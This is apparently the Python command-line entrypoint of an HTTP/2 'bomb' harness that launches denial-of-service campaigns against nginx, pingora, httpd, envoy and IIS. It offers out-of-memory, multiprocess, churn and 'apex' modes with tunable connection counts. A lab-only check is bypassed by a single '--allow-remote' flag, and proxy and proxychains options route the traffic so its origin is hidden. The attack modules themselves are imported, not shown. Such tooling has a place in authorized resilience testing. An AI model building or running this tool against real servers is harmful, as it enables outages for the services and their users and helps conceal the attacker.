"""CLI entrypoint for the HTTP/2 bomb benchmark harness."""
from __future__ import annotations

import argparse
import sys

from attack_runner import run_attack, run_iis_apex_mp
from authorization import is_lab_host
from campaigns import (
    run_apex,
    run_apex_cookie,
    run_apex_cookie_multiprocess,
    run_apex_cookie_scaled,
    run_apex_multiprocess,
    run_apex_scaled,
    run_churn,
    run_cumulative_waves,
    run_full_campaign,
    run_multiprocess,
    run_optimized_single_client_oom,
    run_pipelined_sustain,
    run_ramp,
    run_sustained,
)
from paths import DEFAULT_HOST, DEFAULT_PORT
from tunnel import TUNNEL_MODES, activate_tunnel, load_tunnel_config, merge_tunnel_overrides


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="HTTP/2 bomb benchmark harness")
    parser.add_argument(
        "--host",
        default=DEFAULT_HOST,
        help=f"Target host (default: {DEFAULT_HOST} — lab loopback on this machine)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"Target port (default: {DEFAULT_PORT} — nginx lab-replay)",
    )
    parser.add_argument(
        "--allow-remote",
        action="store_true",
        help="Allow non-localhost targets (use only with written authorization)",
    )
    parser.add_argument("--variant", default="nginx", help="nginx|pingora|httpd|envoy|iis|microsoft-iis")
    parser.add_argument("--iis-preset", default="8gb", choices=["8gb", "32gb", "64gb", "96gb"])
    parser.add_argument(
        "--mode",
        choices=[
            "ramp", "burst", "cumulative", "multiprocess", "sustained",
            "optimized_oom", "churn", "apex", "apex_scaled", "apex_mp",
            "apex_cookie", "apex_cookie_scaled", "apex_cookie_mp", "apex_iis_mp",
            "pipelined_sustain", "full_campaign",
        ],
        default="full_campaign",
    )
    parser.add_argument("--connections", type=int, default=50)
    parser.add_argument("--hold", type=int, default=180, help="Hold seconds (burst mode)")
    parser.add_argument("--drip", type=int, default=25, help="Drip interval seconds (burst mode)")
    parser.add_argument("--tunnel-mode", choices=list(TUNNEL_MODES), default=None, help="Tunnel routing mode")
    parser.add_argument("--proxy-url", default=None, help="Proxy URL (socks5:// or http://)")
    parser.add_argument("--proxychains-conf", default=None, help="proxychains4 config path")
    parser.add_argument("--tunnel-config", default=None, help="Load tunnel profile JSON")
    return parser


def dispatch(args: argparse.Namespace) -> None:
    variant = args.variant
    port = args.port
    bind_default: list[str | None] = [None]

    if args.mode == "ramp":
        run_ramp(
            args.host,
            [5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 60, 70, 80, 100],
            hold=120, drip=25, bind_ips=bind_default,
        )
    elif args.mode == "burst":
        run_attack(
            "burst_seq", args.host, port, args.connections,
            hold=args.hold, drip=args.drip, bomb_mode="sequential", bind_ips=bind_default,
        )
    elif args.mode == "cumulative":
        run_cumulative_waves(args.host, args.connections, wave_size=5, stagger=3, hold=300)
    elif args.mode == "multiprocess":
        run_multiprocess(args.host, args.connections, hold=240, stagger=0.5)
    elif args.mode == "sustained":
        run_sustained(args.host, connections=args.connections, cycles=8, hold=10, drip=5)
    elif args.mode == "optimized_oom":
        run_optimized_single_client_oom(args.host, cycles=25)
    elif args.mode == "churn":
        run_churn(args.host, cycles=40, connections=args.connections)
    elif args.mode == "apex":
        run_apex(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_scaled":
        run_apex_scaled(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_mp":
        run_apex_multiprocess(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_cookie":
        run_apex_cookie(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_cookie_scaled":
        run_apex_cookie_scaled(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_cookie_mp":
        run_apex_cookie_multiprocess(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_iis_mp":
        run_iis_apex_mp(args.host, port, preset_name=args.iis_preset)
    elif args.mode == "pipelined_sustain":
        run_pipelined_sustain(args.host, holders=15, churn_cycles=12)
    else:
        run_full_campaign(args.host, bind_ips=bind_default)


def main(argv: list[str] | None = None) -> None:
    parser = build_parser()
    args = parser.parse_args(argv)

    if not is_lab_host(args.host) and not args.allow_remote:
        print(
            f"Refusing remote target {args.host!r} without --allow-remote. "
            f"Lab default is {DEFAULT_HOST}:{DEFAULT_PORT}.",
            file=sys.stderr,
        )
        sys.exit(2)

    tunnel_cfg = load_tunnel_config(args.tunnel_config)
    tunnel_cfg = merge_tunnel_overrides(
        tunnel_cfg,
        mode=args.tunnel_mode,
        proxy_url=args.proxy_url,
        proxychains_conf=args.proxychains_conf,
    )
    activated = activate_tunnel(tunnel_cfg)
    if activated.mode != "none":
        print(f"Tunnel active: {activated.summary()}", flush=True)

    dispatch(args)
